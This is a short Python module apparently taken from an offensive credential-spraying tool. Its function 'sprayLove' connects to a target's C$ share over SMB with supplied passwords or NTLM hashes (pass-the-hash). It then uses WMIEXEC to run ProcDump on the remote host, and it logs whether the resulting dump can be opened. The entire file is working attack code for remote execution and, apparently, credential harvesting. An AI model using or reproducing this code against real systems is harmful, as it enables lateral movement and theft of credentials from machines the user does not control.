# coding: utf-8

# Author:	Lyderic LEFEBVRE
# Twitter:	@lydericlefebvre
# Mail:		lylefebvre.infosec@gmail.com
# LinkedIn:	https://www.linkedin.com/in/lydericlefebvre


# Imports
import logging
import wmiexec
from core.Utils import *
from core.Colors import *
from core.Arch import *
from core.Connection import *
from multiprocessing import Queue


def sprayLove(user, target, local_ip):
    try:
        smbConnection = Connection(user.username, user.password, user.domain, user.lmhash + ':' + user.nthash, None, 'C$', False, False, None).run(target)
        exec_method = wmiexec.WMIEXEC(smbConnection, user.username, user.password, user.domain, user.lmhash, user.nthash)
        logging.warning("%sProcDumping %s%s%s. Be patient..." % (infoYellow, green, target, white))
        exec_method.run(target, get_os_arch(target))
    except UnboundLocalError:
        logging.info("%s%s: The dump cannot be opened. Check if ProcDump worked with -v debug." % (warningRed, target))
    except Exception as e:
        logging.info("%s%s: %s" % (infoYellow, target, e))
